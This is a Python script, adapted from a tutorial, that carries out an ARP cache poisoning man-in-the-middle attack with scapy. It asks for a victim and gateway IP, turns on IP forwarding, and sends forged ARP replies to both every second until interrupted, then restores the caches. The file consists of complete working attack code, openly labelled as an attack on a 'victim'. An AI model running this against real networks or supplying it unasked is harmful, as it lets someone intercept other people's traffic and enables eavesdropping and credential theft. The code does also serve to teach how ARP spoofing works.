# Adapted from:
# https://thepythoncode.com/article/building-arp-spoofer-using-scapy

from scapy.all import Ether, ARP, srp, send
import time

def enable_linux_iproute():
    print("\n Enabling IP forwarding...")
    """
    Enables IP route ( IP Forward ) in linux-based distro
    """
    file_path = "/proc/sys/net/ipv4/ip_forward"
    with open(file_path, "w") as f:
        print(1, file=f)

def get_mac(ip):
    """
    Returns MAC address of any device connected to the network
    If ip is down, returns None instead
    """
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
    if ans:
        return ans[0][1].src
    
def spoof(target_ip, host_ip):
    """
    Spoofs `target_ip` saying that we are `host_ip`.
    it is accomplished by changing the ARP cache of the target (poisoning)
    """
    # get the mac address of the target
    target_mac = get_mac(target_ip)
    # craft the arp 'is-at' operation packet, in other words; an ARP response
    # we don't specify 'hwsrc' (source MAC address)
    # because by default, 'hwsrc' is the real MAC address of the sender (ours)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
    # send the packet
    # verbose = 0 means that we send the packet without printing any thing
    send(arp_response, verbose=0)
    
    # get the MAC address of the default interface we are using
    self_mac = ARP().hwsrc
    print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, self_mac))

def restore(target_ip, host_ip):
    """
    Restores the normal process of a regular network
    This is done by sending the original informations 
    (real IP and MAC of `host_ip` ) to `target_ip`
    """
    # get the real MAC address of target
    target_mac = get_mac(target_ip)
    # get the real MAC address of spoofed gateway
    host_mac = get_mac(host_ip)
    # crafting the restoring packet
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac, op="is-at")
    # sending the restoring packet
    # to restore the network to its normal process
    # we send each reply seven times for a good measure (count=7)
    send(arp_response, verbose=0, count=7)
    print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, host_mac))

if __name__ == "__main__":
    # target ip address
    print("\nVictim ip:")
    target = input("\t> ")

    # gateway ip address
    print("\nGateway ip:")
    host = input("\t> ")

    # enable ip forwarding
    enable_linux_iproute()

    # perform the attack
    print("Beginning the attack...")
    try:
        while True:
            # telling the `target` that we are the `host`
            spoof(target, host)
            # telling the `host` that we are the `target`
            spoof(host, target)
            # sleep for one second
            time.sleep(1)
    except KeyboardInterrupt: # clean up - undo the attack 
        print("Restoring the network, please wait...")
        restore(target, host)
        restore(host, target)